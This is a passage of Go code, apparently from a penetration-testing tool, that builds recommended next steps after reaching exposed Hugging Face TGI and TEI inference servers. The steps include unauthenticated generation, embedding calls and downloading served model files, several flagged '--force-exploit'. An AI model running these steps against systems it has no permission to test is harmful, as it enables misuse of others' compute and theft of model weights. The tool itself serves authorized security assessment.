			newWorkflowRecommendation(formatCommandExample(base+"generate --prompt 'Hello' --force-exploit"), "Test unauthenticated text generation.", true, 20),
		)
	case "generate":
		rationale = "Generation reachability confirmed; enumerate models, attempt embeddings, and download model files."
		recs = append(recs,
			newWorkflowRecommendation(formatCommandExample(base+"models"), "List served model identifiers to broaden the surface.", false, 10),
			newWorkflowRecommendation(formatCommandExample(base+"embed --inputs 'test' --force-exploit"), "Test the TEI embedding surface on the same host.", true, 20),
			newWorkflowRecommendation(formatCommandExample(base+"model-download --force-exploit"), "Download capped model files (resolves the served model id from /info).", true, 30),
		)
	case "embed":
		rationale = "Embedding reachability confirmed; enumerate models and test the generation surface."
		recs = append(recs,
			newWorkflowRecommendation(formatCommandExample(base+"models"), "List served model identifiers.", false, 10),
			newWorkflowRecommendation(formatCommandExample(base+"generate --prompt 'Hello' --force-exploit"), "Test the TGI generation surface on the same host.", true, 20),
		)
	default:
		return workflowPlan{}
	}
	if len(recs) == 0 {
		return workflowPlan{}
	}
	return workflowPlan{
		Target:          target,
		Stage:           "impact",
		ChainSource:     "huggingface-" + action,
		Rationale:       rationale,
		Recommendations: recs,
	}
}
